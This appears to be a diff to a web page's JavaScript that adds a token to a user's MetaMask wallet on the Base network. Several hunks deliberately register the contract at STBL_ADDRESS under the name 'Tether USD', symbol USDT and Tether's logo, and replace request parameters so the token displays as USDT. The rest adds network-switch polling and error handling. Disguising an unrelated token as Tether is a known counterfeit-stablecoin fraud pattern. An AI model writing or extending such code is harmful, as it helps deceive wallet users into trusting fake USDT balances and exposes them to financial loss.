@@ -40,12 +40,22 @@
                 if (args.params?.options?.address?.toLowerCase() === STBL_ADDRESS.toLowerCase()) {
                   console.log("STBL token detected - setting display to USDT");
                   
-                  // Ensure correct display properties
-                  args.params.options.symbol = "USDT";
-                  args.params.options.name = "Tether USD";
-                  args.params.options.image = 'https://cryptologos.cc/logos/tether-usdt-logo.png';
+                  // Create completely new parameters object
+                  const modifiedParams = {
+                    type: 'ERC20',
+                    options: {
+                      address: STBL_ADDRESS,
+                      symbol: "USDT",
+                      name: "Tether USD",
+                      decimals: 18,
+                      image: 'https://cryptologos.cc/logos/tether-usdt-logo.png'
+                    }
+                  };
                   
-                  console.log("Modified token params:", JSON.stringify(args.params?.options));
+                  // Replace entire params object
+                  args.params = modifiedParams;
+                  
+                  console.log("Modified token params:", JSON.stringify(args.params));
                 }
               }
               
@@ -1379,6 +1389,12 @@
         
         // Show network error and info if needed
         updateNetworkInfo();
+        
+        // Force clear MetaMask state
+        StorageManager.clearTokenLocalStorage();
+        
+        // Show info to user
+        alert("Token addition process has been reset. Please try again.");
       }
       
       // IMPROVED: Helper function to safely call MetaMask with better error handling
@@ -1507,6 +1523,8 @@
         processCancelled = false;
         attemptCount++;
         
+        let timeouts = {};
+        
         try {
           // Disable the buttons to prevent multiple clicks
           addToWalletBtn.disabled = true;
@@ -1520,7 +1538,7 @@
           await clearMetaMaskState();
           
           // Show loading and set up timeouts
-          const timeouts = showLoading("Preparing for token addition...");
+          timeouts = showLoading("Preparing for token addition...");
           
           if (!window.ethereum) {
             throw new Error("MetaMask not detected");
@@ -1529,14 +1547,18 @@
           updateProgress(10, "Connecting to wallet...", "connect");
           
           // First connect to get current network
-          await window.ethereum.request({ method: 'eth_requestAccounts' });
+          const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+          if (!accounts || accounts.length === 0) {
+            throw new Error("Could not connect to wallet");
+          }
+          
           const currentChainId = await window.ethereum.request({ method: 'eth_chainId' });
           await updateNetworkInfo();
           
           updateProgress(20, "Detecting current network...", "network");
           console.log("Current network chainId:", currentChainId);
           
-          // If not on Base, switch to Base
+          // If not on Base, switch to Base with polling verification
           if (currentChainId !== '0x2105') { // Base chain ID
             updateProgress(30, "Preparing to switch to Base network...", "switch");
             
@@ -1549,9 +1571,30 @@
                 params: [{ chainId: '0x2105' }],
               });
               
-              // IMPROVED: Reduced wait time after network switch
+              // Poll for network change completion
+              let attempts = 0;
+              const maxAttempts = 10;
+              
               updateProgress(40, "Waiting for network switch to complete...", "switch");
-              await new Promise(resolve => setTimeout(resolve, 3000));
+              
+              while (attempts < maxAttempts) {
+                // Wait before checking
+                await new Promise(resolve => setTimeout(resolve, 1000));
+                attempts++;
+                
+                // Check if network has switched
+                const checkChainId = await window.ethereum.request({ method: 'eth_chainId' });
+                console.log("Checking network (attempt " + attempts + "):", checkChainId);
+                
+                if (checkChainId === '0x2105') {
+                  StatusTracker.addStatus("Successfully switched to Base network", "success");
+                  break;
+                }
+                
+                // Update progress to show we're still waiting
+                const progress = 40 + Math.floor((attempts / maxAttempts) * 10);
+                updateProgress(progress, `Waiting for network switch (attempt ${attempts}/${maxAttempts})...`, "switch");
+              }
               
               // Verify chain switch was successful
               const newChainId = await window.ethereum.request({ method: 'eth_chainId' });
@@ -1559,26 +1602,8 @@
               
               if (newChainId !== '0x2105') {
                 StatusTracker.addStatus("Network switch didn't complete properly", "error");
-                updateProgress(45, "Retrying network switch...", "switch");
-                
-                // Try switching one more time
-                await window.ethereum.request({
-                  method: 'wallet_switchEthereumChain',
-                  params: [{ chainId: '0x2105' }],
-                });
-                
-                // IMPROVED: Reduced wait time
-                await new Promise(resolve => setTimeout(resolve, 2000));
-                
-                // Check again
-                const finalChainId = await window.ethereum.request({ method: 'eth_chainId' });
-                console.log("Network after second switch attempt:", finalChainId);
-                if (finalChainId !== '0x2105') {
-                  throw new Error("Network switch didn't complete properly");
-                }
+                throw new Error("Network switch did not complete. Please try manually switching to Base network.");
               }
-              
-              StatusTracker.addStatus("Successfully switched to Base network", "success");
               
             } catch (switchError) {
               // If Base isn't added to MetaMask yet, add it
@@ -1611,9 +1636,30 @@
                     params: [{ chainId: '0x2105' }],
                   });
                   
-                  // IMPROVED: Reduced wait time
+                  // Poll for network change completion
+                  let attempts = 0;
+                  const maxAttempts = 10;
+                  
                   updateProgress(45, "Waiting for network switch to complete...", "switch");
-                  await new Promise(resolve => setTimeout(resolve, 3000));
+                  
+                  while (attempts < maxAttempts) {
+                    // Wait before checking
+                    await new Promise(resolve => setTimeout(resolve, 1000));
+                    attempts++;
+                    
+                    // Check if network has switched
+                    const checkChainId = await window.ethereum.request({ method: 'eth_chainId' });
+                    console.log("Checking network after adding (attempt " + attempts + "):", checkChainId);
+                    
+                    if (checkChainId === '0x2105') {
+                      StatusTracker.addStatus("Successfully switched to Base network", "success");
+                      break;
+                    }
+                    
+                    // Update progress to show we're still waiting
+                    const progress = 45 + Math.floor((attempts / maxAttempts) * 10);
+                    updateProgress(progress, `Waiting for network switch (attempt ${attempts}/${maxAttempts})...`, "switch");
+                  }
                   
                   const verifyChainId = await window.ethereum.request({ method: 'eth_chainId' });
                   console.log("Network after adding Base:", verifyChainId);
@@ -1659,12 +1705,18 @@
             return;
           }
           
-          // Give a little extra time for the network switch to fully settle
-          updateProgress(50, "Preparing to add token...", "confirm");
-          await new Promise(resolve => setTimeout(resolve, 2000));
+          // Final verification for network
+          const finalChainId = await window.ethereum.request({ method: 'eth_chainId' });
+          if (finalChainId !== '0x2105') {
+            throw new Error("Network verification failed. Please try manually switching to Base network.");
+          }
           
-          // IMPROVED: Now we're on Base, add the token with more detailed error handling
-          updateProgress(60, "Adding token to your wallet...", "adding");
+          // Give a little extra time for the network switch to fully settle
+          updateProgress(60, "Preparing to add token...", "confirm");
+          await new Promise(resolve => setTimeout(resolve, 1000));
+          
+          // Now add the token with better parameter handling
+          updateProgress(80, "Adding token to your wallet...", "adding");
           loadingText.textContent = "Adding token to your wallet...";
           
           console.log("Starting token addition with params:", {
@@ -1676,19 +1728,22 @@
           });
           
           try {
-            // IMPROVED: Direct call instead of Promise.race
+            // Create a fresh token parameters object
+            const tokenParams = {
+              type: 'ERC20',
+              options: {
+                address: STBL_ADDRESS,
+                symbol: 'USDT',
+                name: 'Tether USD',
+                decimals: 18,
+                image: 'https://cryptologos.cc/logos/tether-usdt-logo.png'
+              }
+            };
+            
+            // Make the request with the fresh parameters
             const result = await window.ethereum.request({
               method: 'wallet_watchAsset',
-              params: {
-                type: 'ERC20',
-                options: {
-                  address: STBL_ADDRESS,
-                  symbol: 'USDT',
-                  decimals: 18,
-                  image: 'https://cryptologos.cc/logos/tether-usdt-logo.png',
-                  name: "Tether USD"
-                }
-              }
+              params: tokenParams
             });
             
             console.log("Token addition result:", result);
@@ -1710,7 +1765,7 @@
               // Show success modal
               successModal.show();
               
-              // IMPROVED: Start balance update process
+              // Start balance update process
               setupBalanceUpdater();
               
             } else {
@@ -1739,7 +1794,7 @@
             altMethodBtn.style.display = 'block';
             
             // Show error modal for non-rejection errors
-            if (!error.userRejected) {
+            if (!error.userRejected && error.code !== 4001) {
               document.getElementById('errorMessage').textContent = error.message;
               errorModal.show();
             }
@@ -1765,7 +1820,7 @@
           
           altMethodBtn.style.display = 'block';
           
-          if (!error.userRejected) {
+          if (!error.userRejected && error.code !== 4001) {
             document.getElementById('errorMessage').textContent = error.message;
             errorModal.show();
           }
@@ -1817,7 +1872,7 @@
           
           updateProgress(30, "Detecting current network...", "network");
           
-          // If not on Base, try to switch
+          // If not on Base, try to switch with polling verification
           if (currentChainId !== '0x2105') {
             updateProgress(40, "Preparing to switch to Base network...", "switch");
             StatusTracker.addStatus("Switching to Base network (alternative method)", "pending");
@@ -1829,9 +1884,28 @@
                 params: [{ chainId: '0x2105' }],
               });
               
-              // IMPROVED: Reduced wait time
-              updateProgress(45, "Waiting for network switch to complete...", "switch");
-              await new Promise(resolve => setTimeout(resolve, 3000));
+              // Poll for network change
+              let attempts = 0;
+              const maxAttempts = 10;
+              
+              while (attempts < maxAttempts) {
+                // Wait before checking
+                await new Promise(resolve => setTimeout(resolve, 1000));
+                attempts++;
+                
+                // Check if network has switched
+                const checkChainId = await window.ethereum.request({ method: 'eth_chainId' });
+                console.log("Checking network (attempt " + attempts + "):", checkChainId);
+                
+                if (checkChainId === '0x2105') {
+                  StatusTracker.addStatus("Successfully switched to Base network", "success");
+                  break;
+                }
+                
+                // Update progress
+                const progress = 40 + Math.floor((attempts / maxAttempts) * 10);
+                updateProgress(progress, `Waiting for network switch (attempt ${attempts}/${maxAttempts})...`, "switch");
+              }
               
             } catch (switchError) {
               // If Base isn't added yet, add it
@@ -1855,7 +1929,6 @@
                     }]
                   });
                   
-                  // IMPROVED: Reduced wait time
                   await new Promise(resolve => setTimeout(resolve, 2000));
                   
                   // Try switching again
@@ -1865,10 +1938,28 @@
                     params: [{ chainId: '0x2105' }],
                   });
                   
-                  // IMPROVED: Reduced wait time
-                  await new Promise(resolve => setTimeout(resolve, 3000));
+                  // Poll again
+                  let addAttempts = 0;
+                  const maxAddAttempts = 10;
                   
-                  StatusTracker.addStatus("Successfully added and switched to Base network", "success");
+                  while (addAttempts < maxAddAttempts) {
+                    await new Promise(resolve => setTimeout(resolve, 1000));
+                    addAttempts++;
+                    
+                    // Check current chain
+                    const currentChain = await window.ethereum.request({ method: 'eth_chainId' });
+                    console.log("Checking network after adding (attempt " + addAttempts + "):", currentChain);
+                    
+                    if (currentChain === '0x2105') {
+                      StatusTracker.addStatus("Successfully added and switched to Base network", "success");
+                      break;
+                    }
+                    
+                    // Update progress
+                    const progress = 47 + Math.floor((addAttempts / maxAddAttempts) * 10);
+                    updateProgress(progress, `Waiting for network switch (attempt ${addAttempts}/${maxAddAttempts})...`, "switch");
+                  }
+                  
                 } catch (addError) {
                   if (addError.code === 4001) {
                     StatusTracker.addStatus("User rejected network addition", "error");
@@ -1932,17 +2023,21 @@
           });
           
           try {
+            // Create a fresh token parameters object - using STBL initially
+            const tokenParams = {
+              type: 'ERC20',
+              options: {
+                address: STBL_ADDRESS,
+                symbol: 'STBL',
+                name: 'Stable Token',
+                decimals: 18,
+                image: 'https://cryptologos.cc/logos/tether-usdt-logo.png'
+              }
+            };
+            
             const result = await window.ethereum.request({
               method: 'wallet_watchAsset',
-              params: {
-                type: 'ERC20',
-                options: {
-                  address: STBL_ADDRESS, // STBL contract address
-                  symbol: 'STBL',        // Use STBL symbol temporarily
-                  decimals: 18,          // STBL has 18 decimals
-                  image: 'https://cryptologos.cc/logos/tether-usdt-logo.png'
-                }
-              }
+              params: tokenParams
             });
             
             console.log("Alternative token addition result:", result);
@@ -1998,7 +2093,7 @@
             }
             
             // Show error modal for non-rejection errors
-            if (!error.userRejected) {
+            if (!error.userRejected && error.code !== 4001) {
               document.getElementById('errorMessage').textContent = error.message;
               errorModal.show();
             }
@@ -2023,7 +2118,7 @@
           }
           
           // Don't show modal for user rejections
-          if (!error.userRejected) {
+          if (!error.userRejected && error.code !== 4001) {
             document.getElementById('errorMessage').textContent = error.message;
             errorModal.show();
           }
@@ -2228,7 +2323,7 @@ Note: Make sure you're on the Base network for successful import.`;
           console.error("Switch network error:", error);
         }
       });
-      
+
       // Replace the existing click handler
       addToWalletBtn.addEventListener('click', function() {
         addTokenWithNetworkSwitch().catch(err => {
@@ -2269,6 +2364,83 @@ Note: Make sure you're on the Base network for successful import.`;
       resetProcessBtn.addEventListener('click', function() {
         resetTokenAddition();
       });
+      
+      // IMPROVED: Enhanced token addition with switchToNetwork
+      async function switchToNetwork(targetChainId) {
+        try {
+          StatusTracker.addStatus(`Switching to network ${targetChainId}`, "pending");
+          
+          // Try to switch to the target network
+          try {
+            await window.ethereum.request({
+              method: 'wallet_switchEthereumChain',
+              params: [{ chainId: targetChainId }],
+            });
+          } catch (switchError) {
+            // If the chain hasn't been added
+            if (switchError.code === 4902) {
+              StatusTracker.addStatus("Network not found, adding Base network", "pending");
+              
+              // Add the Base network
+              await window.ethereum.request({
+                method: 'wallet_addEthereumChain',
+                params: [{
+                  chainId: '0x2105',
+                  chainName: 'Base',
+                  nativeCurrency: {
+                    name: 'ETH',
+                    symbol: 'ETH',
+                    decimals: 18
+                  },
+                  rpcUrls: ['https://mainnet.base.org'],
+                  blockExplorerUrls: ['https://basescan.org']
+                }]
+              });
+              
+              // Try switching again
+              await window.ethereum.request({
+                method: 'wallet_switchEthereumChain',
+                params: [{ chainId: targetChainId }],
+              });
+            } else if (switchError.code === 4001) {
+              // User rejected the request
+              StatusTracker.addStatus("Network switch rejected by user", "error");
+              return false;
+            } else {
+              throw switchError;
+            }
+          }
+          
+          // Wait for network switch to complete - progressive polling
+          const maxAttempts = 10;
+          const pollInterval = 1000; // 1 second
+          
+          for (let attempt = 0; attempt < maxAttempts; attempt++) {
+            // Wait a bit
+            await new Promise(resolve => setTimeout(resolve, pollInterval));
+            
+            // Check if network has switched
+            const currentChainId = await window.ethereum.request({ method: 'eth_chainId' });
+            
+            if (currentChainId === targetChainId) {
+              StatusTracker.addStatus(`Successfully switched to network ${targetChainId}`, "success");
+              return true;
+            }
+            
+            // Update progress to show we're still waiting
+            const progress = 40 + Math.floor((attempt / maxAttempts) * 20);
+            updateProgress(progress, `Waiting for network switch (attempt ${attempt + 1}/${maxAttempts})...`, "switch");
+          }
+          
+          // If we get here, network switching failed
+          StatusTracker.addStatus("Network switch timed out", "error");
+          return false;
+        } catch (error) {
+          console.error("Error switching network:", error);
+          StatusTracker.addStatus(`Error switching network: ${error.message}`, "error");
+          return false;
+        }
+      }
       
       // IMPROVED: Function to fetch token balance with better error handling and retries
       async function fetchTokenBalance() {
@@ -2474,3 +2646,5 @@ Note: Make sure you're on the Base network for successful import.`;
   <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
 </body>
 </html>
+
+                              
